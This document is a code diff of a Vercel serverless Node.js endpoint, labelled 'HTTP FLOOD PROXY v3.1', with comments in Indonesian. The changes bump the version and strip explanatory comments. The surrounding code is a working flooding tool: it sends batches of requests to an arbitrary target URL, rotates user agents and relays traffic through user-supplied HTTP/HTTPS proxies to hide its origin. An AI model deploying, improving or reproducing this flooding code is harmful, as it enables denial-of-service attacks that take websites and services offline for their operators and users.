@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- *  VERCEL SERVERLESS — HTTP FLOOD PROXY v3.0
+ *  VERCEL SERVERLESS — HTTP FLOOD PROXY v3.1
  * ============================================================================
  *  Runtime: Node.js (bukan Edge) — supaya bisa pakai proxy.txt + ua.txt
  *  Endpoint: GET/POST /api/flood
@@ -11,19 +11,6 @@
  *    &count=<1-10>       (opsional) default 1
  *    &health=1           → status endpoint
  *    &selftest=1         → self-test ke httpbin
- *
- *  CATATAN BATASAN FISIK:
- *  ─────────────────────
- *  Server Vercel tidak bisa menjangkau IP privat (192.168.x.x, 10.x.x.x,
- *  172.16-31.x.x). Kalau target privat DAN proxy juga di luar LAN target,
- *  request PASTI gagal. Ini bukan bug.
- *
- *  Solusi untuk IP privat:
- *    • Matikan proxy (biarkan browser kirim langsung)
- *    • Atau gunakan proxy YANG BERADA DI JARINGAN YANG SAMA dengan target
- *      (misal: proxy lokal di Raspberry Pi pada LAN yang sama)
- *
- *  Untuk target publik (domain/ngrok/Cloudflare Tunnel), proxy.txt BERFUNGSI.
  * ============================================================================
  */
 
@@ -35,7 +22,7 @@ import { randomBytes } from 'node:crypto';
 /* ============================================================================
  *  KONFIGURASI
  * ============================================================================ */
-const VERSION = '3.0.0';
+const VERSION = '3.1.0';
 const REQUEST_TIMEOUT_MS = 6000;
 const MAX_CONCURRENT = 5;
 const MAX_BATCH = 10;
@@ -145,25 +132,16 @@ function validateTarget(rawTarget) {
 
 /* ============================================================================
  *  UTILITIES — PROXY PARSER
- *  Support format:
- *    host:port
- *    http://host:port
- *    https://host:port
- *    host:port:user:pass
- *    http://user:pass@host:port
- *    socks5://host:port (akan di-skip, tidak didukung)
  * ============================================================================ */
 function parseProxy(rawProxy) {
   if (!rawProxy || typeof rawProxy !== 'string') return null;
   const s = rawProxy.trim();
   if (!s) return null;
 
-  // Skip SOCKS (tidak didukung tanpa library tambahan)
   if (/^socks[45]:\/\//i.test(s)) {
     return { ok: false, code: 'SOCKS_UNSUPPORTED', message: 'SOCKS proxy tidak didukung di Node native' };
   }
 
-  // Format: host:port:user:pass
   const partsSimple = s.match(/^([^:@\s]+):(\d+):([^:\s]+):([^\s]+)$/);
   if (partsSimple) {
     return {
@@ -175,7 +153,6 @@ function parseProxy(rawProxy) {
     };
   }
 
-  // Format dengan protocol
   try {
     const u = new URL(/^https?:\/\//i.test(s) ? s : 'http://' + s);
     if (!u.hostname || !u.port) {
@@ -190,7 +167,6 @@ function parseProxy(rawProxy) {
       auth: auth
     };
   } catch (e) {
-    // Format: host:port tanpa protocol
     const m = s.match(/^([^:@\s]+):(\d+)$/);
     if (m) {
       return {
@@ -206,8 +182,7 @@ function parseProxy(rawProxy) {
 }
 
 /* ============================================================================
- *  HTTP REQUEST VIA PROXY (untuk target HTTP)
- *  Proxy HTTP standar: connect ke proxy, kirim full URL di path
+ *  HTTP REQUEST VIA PROXY
  * ============================================================================ */
 function requestHttpViaProxy(target, proxy, method, ua) {
   return new Promise((resolve) => {
@@ -235,7 +210,7 @@ function requestHttpViaProxy(target, proxy, method, ua) {
         headers: headers,
         timeout: REQUEST_TIMEOUT_MS
       }, (res) => {
-        res.on('data', () => { /* discard */ });
+        res.on('data', () => {});
         res.on('end', () => {
           resolve({
             success: true,
@@ -286,7 +261,7 @@ function requestHttpViaProxy(target, proxy, method, ua) {
 }
 
 /* ============================================================================
- *  HTTPS REQUEST VIA PROXY (CONNECT tunnel)
+ *  HTTPS REQUEST VIA PROXY
  * ============================================================================ */
 function requestHttpsViaProxy(target, proxy, method, ua) {
   return new Promise((resolve) => {
@@ -345,7 +320,7 @@ function requestHttpsViaProxy(target, proxy, method, ua) {
             agent: false,
             timeout: REQUEST_TIMEOUT_MS
           }, (httpsRes) => {
-            httpsRes.on('data', () => { /* discard */ });
+            httpsRes.on('data', () => {});
             httpsRes.on('end', () => {
               try { socket.end(); } catch (e) {}
               resolve({
@@ -436,7 +411,7 @@ function requestHttpsViaProxy(target, proxy, method, ua) {
 }
 
 /* ============================================================================
- *  DIRECT REQUEST (tanpa proxy)
+ *  DIRECT REQUEST
  * ============================================================================ */
 function requestDirect(target, method, ua) {
   return new Promise((resolve) => {
@@ -463,7 +438,7 @@ function requestDirect(target, method, ua) {
     let req;
     try {
       req = mod.request(options, (res) => {
-        res.on('data', () => { /* discard */ });
+        res.on('data', () => {});
         res.on('end', () => {
           resolve({
             success: true,
@@ -532,10 +507,9 @@ function classifyError(err) {
 }
 
 /* ============================================================================
- *  SINGLE REQUEST EXECUTOR (dengan routing proxy/direct)
+ *  SINGLE REQUEST EXECUTOR
  * ============================================================================ */
 async function executeOne(targetUrl, method, proxyStr, ua) {
-  // Cek proxy valid
   let proxy = null;
   if (proxyStr) {
     const parsed = parseProxy(proxyStr);
@@ -553,7 +527,6 @@ async function executeOne(targetUrl, method, proxyStr, ua) {
     }
   }
 
-  // Cek target privat + proxy dari luar → pasti gagal
   const isPrivate = isPrivateHostname(targetUrl.hostname);
   if (isPrivate && proxy) {
     return {
@@ -567,7 +540,6 @@ async function executeOne(targetUrl, method, proxyStr, ua) {
     };
   }
 
-  // Route request
   if (proxy) {
     if (targetUrl.protocol === 'https:') {
       return requestHttpsViaProxy(targetUrl, proxy, method, ua);
@@ -580,7 +552,7 @@ async function executeOne(targetUrl, method, proxyStr, ua) {
 }
 
 /* ============================================================================
- *  BATCH EXECUTOR (concurrency-limited)
+ *  BATCH EXECUTOR
  * ============================================================================ */
 async function executeBatch(targetUrl, method, proxyStr, ua, totalCount) {
   const results = [];
@@ -668,10 +640,9 @@ function sendError(res, code, message, status, extra) {
 }
 
 /* ============================================================================
- *  MAIN HANDLER (Node.js runtime)
+ *  MAIN HANDLER
  * ============================================================================ */
 export default async function handler(req, res) {
-  // CORS preflight
   if (req.method === 'OPTIONS') {
     res.statusCode = 204;
     res.setHeader('access-control-allow-origin', '*');
@@ -687,7 +658,6 @@ export default async function handler(req, res) {
     return;
   }
 
-  // Parse query
   const q = req.query || {};
   const rawTarget = q.target;
   const proxyStr = q.proxy || null;
@@ -695,7 +665,6 @@ export default async function handler(req, res) {
   const rawMethod = (q.method || 'GET').toUpperCase();
   const countStr = q.count;
 
-  // Health check
   if (q.health === '1') {
     sendJson(res, {
       success: true,
@@ -717,7 +686,6 @@ export default async function handler(req, res) {
     return;
   }
 
-  // Self test
   if (q.selftest === '1') {
     const testTarget = new URL('https://httpbin.org/get');
     const result = await executeOne(testTarget, 'GET', null, randomFrom(DEFAULT_UAS));
@@ -725,13 +693,11 @@ export default async function handler(req, res) {
     return;
   }
 
-  // Validate method
   if (!ALLOWED_METHODS.includes(rawMethod)) {
     sendError(res, ERROR_CODES.INVALID_METHOD, 'Method tidak diizinkan: ' + rawMethod, 400);
     return;
   }
 
-  // Validate target
   const validation = validateTarget(rawTarget);
   if (!validation.ok) {
     sendError(res, validation.code, validation.message, 400);
@@ -739,7 +705,6 @@ export default async function handler(req, res) {
   }
   const targetUrl = validation.url;
 
-  // Validate proxy string jika ada
   if (proxyStr) {
     const parsedProxy = parseProxy(proxyStr);
     if (!parsedProxy || !parsedProxy.ok) {
@@ -753,17 +718,14 @@ export default async function handler(req, res) {
     }
   }
 
-  // Parse count
   let count = 1;
   if (countStr) {
     const n = parseInt(countStr, 10);
     if (!isNaN(n) && n > 0) count = Math.min(n, MAX_BATCH);
   }
 
-  // UA
   const finalUA = (uaStr && uaStr.trim()) ? uaStr.trim().slice(0, 500) : randomFrom(DEFAULT_UAS);
 
-  // Eksekusi
   const startTime = Date.now();
   try {
     const results = await executeBatch(targetUrl, rawMethod, proxyStr, finalUA, count);
@@ -797,7 +759,7 @@ export default async function handler(req, res) {
 }
 
 /* ============================================================================
- *  MASK PROXY (untuk logging)
+ *  MASK PROXY
  * ============================================================================ */
 function maskProxy(proxyStr) {
   try {
@@ -812,7 +774,7 @@ function maskProxy(proxyStr) {
 }
 
 /* ============================================================================
- *  CONFIG EXPORT — biar Vercel tahu ini Node runtime
+ *  CONFIG EXPORT
  * ============================================================================ */
 export const config = {
   maxDuration: 60
